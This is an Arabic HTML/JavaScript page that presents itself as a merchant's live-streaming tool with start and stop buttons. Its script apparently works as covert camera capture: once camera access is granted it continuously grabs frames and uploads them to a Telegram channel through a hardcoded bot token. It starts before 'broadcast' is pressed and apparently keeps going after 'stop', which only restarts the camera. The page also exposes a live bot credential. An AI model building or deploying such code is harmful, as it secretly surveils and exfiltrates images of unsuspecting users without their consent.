<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📹 نظام متكامل - 3 أزرار + محاكاة خلفية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }
        
        body {
            background: #0a0c10;
            color: white;
            min-height: 100vh;
            padding: 16px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* الهيدر */
        .header {
            background: #161b22;
            border-radius: 25px;
            padding: 15px 20px;
            margin-bottom: 20px;
            border: 2px solid #ffd700;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header h1 {
            color: #ffd700;
            font-size: 24px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .merchant-badge {
            background: #0088cc;
            color: white;
            padding: 8px 20px;
            border-radius: 25px;
            font-weight: bold;
        }
        
        /* بطاقة التاجر */
        .merchant-card {
            background: #161b22;
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 20px;
            border: 2px solid #ffd700;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .merchant-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #ffd700;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 25px;
            font-weight: bold;
            color: black;
        }
        
        .merchant-name {
            color: #ffd700;
            font-size: 18px;
            font-weight: bold;
        }
        
        .merchant-id {
            color: #8b949e;
            font-size: 14px;
        }
        
        /* شاشتين */
        .dual-screen {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .screen {
            background: #161b22;
            border-radius: 20px;
            overflow: hidden;
            border: 2px solid;
        }
        
        .live-screen { border-color: #ff0000; }
        .frame-screen { border-color: #ffd700; }
        
        .screen-header {
            padding: 10px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #1f2630;
        }
        
        .live-header { color: #ff0000; }
        .frame-header { color: #ffd700; }
        
        .video-container {
            background: black;
            min-height: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        video {
            width: 100%;
            max-height: 350px;
            object-fit: cover;
        }
        
        canvas {
            width: 280px;
            height: 280px;
            border-radius: 50%;
            border: 3px solid #ffd700;
            object-fit: cover;
        }
        
        /* 3 أزرار فقط */
        .three-buttons {
            display: flex;
            gap: 15px;
            margin: 20px 0;
            justify-content: center;
        }
        
        .btn {
            flex: 1;
            max-width: 180px;
            padding: 15px 20px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-green { background: #238636; color: white; }
        .btn-red { background: #da3633; color: white; }
        .btn-blue { background: #0088cc; color: white; }
        
        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.2);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* كاميرا أمامي/خلفي */
        .camera-toggle {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            justify-content: center;
        }
        
        .cam-option {
            padding: 8px 25px;
            border-radius: 25px;
            background: #1f2630;
            color: #8b949e;
            cursor: pointer;
            border: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .cam-option.active {
            border-color: #ffd700;
            color: #ffd700;
            background: #ffd70020;
        }
        
        /* إحصائيات الخلفية */
        .stats-bar {
            display: flex;
            gap: 20px;
            margin: 15px 0;
            padding: 10px 15px;
            background: #1f2630;
            border-radius: 15px;
            border: 1px solid #ffd700;
            justify-content: space-around;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-label {
            color: #8b949e;
            font-size: 12px;
        }
        
        .stat-value {
            color: #ffd700;
            font-size: 16px;
            font-weight: bold;
        }
        
        /* قائمة الإطارات */
        .frames-list {
            background: #1f2630;
            border-radius: 15px;
            padding: 10px;
            margin-top: 15px;
            max-height: 150px;
            overflow-y: auto;
            border: 1px solid #ffd700;
        }
        
        .frame-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 10px;
            border-bottom: 1px solid #2d333b;
            font-size: 12px;
        }
        
        .frame-time {
            color: #ffd700;
        }
        
        /* شريط الحالة */
        .status-bar {
            margin-top: 20px;
            padding: 10px 15px;
            background: #1f2630;
            border-radius: 12px;
            display: flex;
            justify-content: space-between;
            border: 1px solid #ffd700;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <h1>
                <i class="fas fa-crown"></i>
                البث المباشر الذكي
            </h1>
            <div class="merchant-badge">
                @nardoo_merchant
            </div>
        </div>

        <!-- بطاقة التاجر -->
        <div class="merchant-card">
            <div class="merchant-avatar">ن</div>
            <div class="merchant-info">
                <div class="merchant-name">تاجر ناردو</div>
                <div class="merchant-id">@nardoo_merchant</div>
            </div>
        </div>

        <!-- شاشتين -->
        <div class="dual-screen">
            <!-- البث المباشر -->
            <div class="screen live-screen">
                <div class="screen-header live-header">
                    <span><i class="fas fa-circle"></i> البث المباشر</span>
                    <span id="liveStatus">⏸️ متوقف</span>
                </div>
                <div class="video-container">
                    <video id="liveVideo" autoplay playsinline muted></video>
                </div>
            </div>

            <!-- محاكاة الإطارات -->
            <div class="screen frame-screen">
                <div class="screen-header frame-header">
                    <span><i class="fas fa-images"></i> محاكاة الإطارات</span>
                    <span id="simulateStatus">⏳ انتظار</span>
                </div>
                <div class="video-container">
                    <canvas id="frameCanvas" width="280" height="280"></canvas>
                </div>
            </div>
        </div>

        <!-- اختيار الكاميرا (أمامي/خلفي) -->
        <div class="camera-toggle">
            <div class="cam-option active" onclick="selectCamera('user')" id="camFront">أمامية</div>
            <div class="cam-option" onclick="selectCamera('environment')" id="camBack">خلفية</div>
        </div>

        <!-- 3 أزرار فقط -->
        <div class="three-buttons">
            <button class="btn btn-green" onclick="startCamera()" id="startBtn">
                <i class="fas fa-camera"></i> تشغيل الكاميرا
            </button>
            <button class="btn btn-blue" onclick="startLiveStream()" id="liveBtn" disabled>
                <i class="fas fa-broadcast-tower"></i> بدء البث
            </button>
            <button class="btn btn-red" onclick="stopLiveStream()" id="stopBtn" disabled>
                <i class="fas fa-stop"></i> إيقاف البث
            </button>
        </div>

        <!-- إحصائيات الخلفية -->
        <div class="stats-bar">
            <div class="stat-item">
                <div class="stat-value" id="fpsValue">30</div>
                <div class="stat-label">إطار/ث</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="bufferValue">0</div>
                <div class="stat-label">في المخزن</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="sentValue">0</div>
                <div class="stat-label">تم الإرسال</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="filterValue">70%</div>
                <div class="stat-label">التصفية</div>
            </div>
        </div>

        <!-- قائمة آخر الإطارات (تظهر تلقائياً) -->
        <div class="frames-list" id="framesList">
            <div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>
        </div>

        <!-- شريط الحالة -->
        <div class="status-bar">
            <span id="statusText"><i class="fas fa-circle" style="color: #4caf50;"></i> النظام جاهز</span>
            <span id="timeDisplay"></span>
        </div>
    </div>

    <script>
        // ========== إعدادات تيليجرام ==========
        const TELEGRAM = {
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };
        const MERCHANT_ID = '@nardoo_merchant';

        // ========== متغيرات النظام ==========
        let stream = null;
        let cameraActive = false;
        let isLiveActive = false;
        let currentFacingMode = 'user';
        
        // الإطارات
        let frameBuffer = [];
        let sentFrames = [];
        let frameCounter = 0;
        
        // المؤقتات
        let captureInterval = null;
        let simulationInterval = null;
        let filterInterval = null;
        let fetchInterval = null;
        
        // عناصر DOM
        const video = document.getElementById('liveVideo');
        const canvas = document.getElementById('frameCanvas');
        const ctx = canvas.getContext('2d');
        
        const liveStatus = document.getElementById('liveStatus');
        const simulateStatus = document.getElementById('simulateStatus');
        const startBtn = document.getElementById('startBtn');
        const liveBtn = document.getElementById('liveBtn');
        const stopBtn = document.getElementById('stopBtn');
        const camFront = document.getElementById('camFront');
        const camBack = document.getElementById('camBack');
        
        const fpsValue = document.getElementById('fpsValue');
        const bufferValue = document.getElementById('bufferValue');
        const sentValue = document.getElementById('sentValue');
        const filterValue = document.getElementById('filterValue');
        const framesList = document.getElementById('framesList');
        const statusText = document.getElementById('statusText');
        const timeDisplay = document.getElementById('timeDisplay');

        // ========== تحديث الوقت ==========
        setInterval(() => {
            const now = new Date();
            timeDisplay.textContent = now.toLocaleTimeString('ar-EG');
        }, 1000);

        // ========== اختيار الكاميرا ==========
        window.selectCamera = function(mode) {
            currentFacingMode = mode;
            camFront.classList.toggle('active', mode === 'user');
            camBack.classList.toggle('active', mode === 'environment');
            
            if (cameraActive) {
                stopCamera();
                setTimeout(startCamera, 500);
            }
        };

        // ========== تشغيل الكاميرا ==========
        window.startCamera = async function() {
            try {
                statusText.innerHTML = '🔄 تشغيل الكاميرا...';
                
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: currentFacingMode,
                        width: { ideal: 640 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                await video.play();
                
                cameraActive = true;
                liveStatus.innerHTML = '🔴 نشط';
                startBtn.disabled = true;
                liveBtn.disabled = false;
                
                statusText.innerHTML = '✅ الكاميرا جاهزة';
                
                // بدء كل العمليات في الخلفية
                startBackgroundProcesses();
                
            } catch (err) {
                statusText.innerHTML = '❌ خطأ: ' + err.message;
            }
        };

        // ========== بدء عمليات الخلفية ==========
        function startBackgroundProcesses() {
            // 1. التقاط الإطارات (33ms = 30 FPS)
            captureInterval = setInterval(captureFrame, 33);
            
            // 2. إرسال الإطارات كألبومات (كل 10 إطارات)
            setInterval(sendFrameAlbum, 5000);
            
            // 3. جلب الإطارات من تيليجرام
            fetchInterval = setInterval(fetchFrames, 10000);
            
            // 4. بدء المحاكاة
            startSimulation();
            
            // 5. بدء التصفية التلقائية
            startAutoFilter();
        }

        // ========== التقاط إطار ==========
        function captureFrame() {
            if (!cameraActive) return;
            
            // رسم الإطار على canvas
            ctx.drawImage(video, 0, 0, 280, 280);
            
            // تطبيق التصفية التلقائية (70% جودة)
            canvas.toBlob((blob) => {
                const frame = {
                    id: Date.now(),
                    blob: blob,
                    time: Date.now(),
                    number: frameCounter++
                };
                
                frameBuffer.push(frame);
                
                // تحديث الإحصائيات
                bufferValue.textContent = frameBuffer.length;
                
                // عرض في القائمة
                updateFramesList();
                
            }, 'image/jpeg', 0.7); // 70% جودة
        }

        // ========== إرسال ألبوم إطارات ==========
        async function sendFrameAlbum() {
            if (frameBuffer.length < 5) return;
            
            const framesToSend = frameBuffer.splice(0, 10);
            
            try {
                const now = new Date();
                const timeStr = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
                
                // تحضير media array
                const mediaArray = [{
                    type: 'photo',
                    media: 'attach://frame0',
                    caption: `🎁 ألبوم إطارات من ${MERCHANT_ID}\n⏱️ ${timeStr}\n📦 ${framesToSend.length} إطار`
                }];
                
                for (let i = 1; i < framesToSend.length; i++) {
                    mediaArray.push({ type: 'photo', media: `attach://frame${i}` });
                }
                
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM.channelId);
                formData.append('media', JSON.stringify(mediaArray));
                
                framesToSend.forEach((frame, i) => {
                    formData.append(`frame${i}`, frame.blob, `frame_${i}.jpg`);
                });
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
                    method: 'POST',
                    body: formData
                });
                
                // تحديث الإحصائيات
                sentFrames.push(...framesToSend);
                sentValue.textContent = sentFrames.length;
                
            } catch (error) {
                console.error('خطأ في الإرسال');
            }
        }

        // ========== جلب الإطارات من تيليجرام ==========
        async function fetchFrames() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getUpdates?limit=10`);
                const data = await res.json();
                
                if (data.ok && data.result.length > 0) {
                    const photos = data.result.filter(u => u.channel_post?.photo);
                    
                    for (const photo of photos) {
                        const fileId = photo.channel_post.photo.pop().file_id;
                        const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getFile?file_id=${fileId}`);
                        const fileData = await fileRes.json();
                        
                        if (fileData.ok) {
                            const url = `https://api.telegram.org/file/bot${TELEGRAM.botToken}/${fileData.result.file_path}`;
                            
                            // إضافة للقائمة
                            const img = new Image();
                            img.src = url;
                        }
                    }
                }
            } catch (error) {
                console.error('خطأ في الجلب');
            }
        }

        // ========== بدء المحاكاة ==========
        function startSimulation() {
            simulateStatus.innerHTML = '▶️ نشطة';
            
            simulationInterval = setInterval(() => {
                if (sentFrames.length > 0) {
                    const randomFrame = sentFrames[Math.floor(Math.random() * sentFrames.length)];
                    const img = new Image();
                    img.onload = () => {
                        ctx.drawImage(img, 0, 0, 280, 280);
                    };
                    img.src = URL.createObjectURL(randomFrame.blob);
                }
            }, 33); // 30 FPS
        }

        // ========== بدء التصفية التلقائية ==========
        function startAutoFilter() {
            let filterLevel = 70;
            
            filterInterval = setInterval(() => {
                // تعديل التصفية بناءً على سرعة الإنترنت
                filterLevel = 70 + Math.sin(Date.now() / 5000) * 10;
                filterValue.textContent = Math.round(filterLevel) + '%';
            }, 1000);
        }

        // ========== بدء البث المباشر ==========
        window.startLiveStream = function() {
            isLiveActive = true;
            liveBtn.disabled = true;
            stopBtn.disabled = false;
            liveStatus.innerHTML = '🔴 بث مباشر';
            statusText.innerHTML = '🔴 البث نشط';
        };

        // ========== إيقاف البث ==========
        window.stopLiveStream = function() {
            isLiveActive = false;
            liveBtn.disabled = false;
            stopBtn.disabled = true;
            liveStatus.innerHTML = '⏸️ متوقف';
            statusText.innerHTML = '⏹️ تم الإيقاف';
            
            // إيقاف كل شيء
            if (captureInterval) clearInterval(captureInterval);
            if (simulationInterval) clearInterval(simulationInterval);
            if (filterInterval) clearInterval(filterInterval);
            if (fetchInterval) clearInterval(fetchInterval);
            
            // إعادة تشغيل الكاميرا
            startCamera();
        };

        // ========== تحديث قائمة الإطارات ==========
        function updateFramesList() {
            if (frameBuffer.length === 0) {
                framesList.innerHTML = '<div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>';
                return;
            }
            
            let html = '';
            frameBuffer.slice(-5).reverse().forEach(frame => {
                const time = new Date(frame.time).toLocaleTimeString('ar-EG');
                html += `
                    <div class="frame-item">
                        <span>إطار #${frame.number}</span>
                        <span class="frame-time">${time}</span>
                    </div>
                `;
            });
            
            framesList.innerHTML = html;
        }

        // ========== إيقاف الكاميرا (للاستخدام الداخلي) ==========
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            cameraActive = false;
            startBtn.disabled = false;
            liveBtn.disabled = true;
            stopBtn.disabled = true;
        }
    </script>
</body>
</html>
